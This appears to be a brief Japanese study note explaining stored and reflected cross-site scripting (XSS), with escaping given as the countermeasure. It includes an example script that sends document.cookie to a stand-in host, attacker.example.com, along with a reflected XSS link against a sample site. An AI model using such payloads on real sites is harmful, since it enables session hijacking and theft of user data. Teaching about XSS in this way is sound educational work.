---
title: "XSS (Cross-Site Scripting)"
draft: false
weight: 999
---

攻撃者が悪意あるスクリプトをユーザに実行させる

## 持続型 XSS (stored)

攻撃用の JS が攻撃対象のサイトに保存されているタイプの XSS。
攻撃者の悪意ある入力がデータベースに保存され、他のユーザがサイトにアクセスした時に実行される。

例えば、チャットアプリで攻撃者が

```html
<script>alert("Hacked!");</script>
```

と投稿し、その内容がエスケープなどの適切な処理をされなかったとする。

この時、ユーザがチャットアプリにアクセスすると上記の script タグが実行される。
alert だけなら問題はないかもしれないが、下記のような script にすれば cookie を攻撃者に送信することができてしまう。

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://attacker.example.com/steal-data", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("cookie=" + document.cookie);
</script>
```

## 反射型 XSS (reflected)

攻撃用の JS が攻撃対象のサイトではない場所にある場合の XSS。
持続型のXSS と比べて影響範囲は小さそう。

例えば偽サイトのリンクやメール、SNS の URL として次のようなリンクを仕込んでおく。

```html
https://victim.example.com/search?q=<script>alert('Hacked!');</script>
```

攻撃対象のサイトでパラメータを適切に処理していない場合に script が実行されてしまう。

## 対策

エスケープ
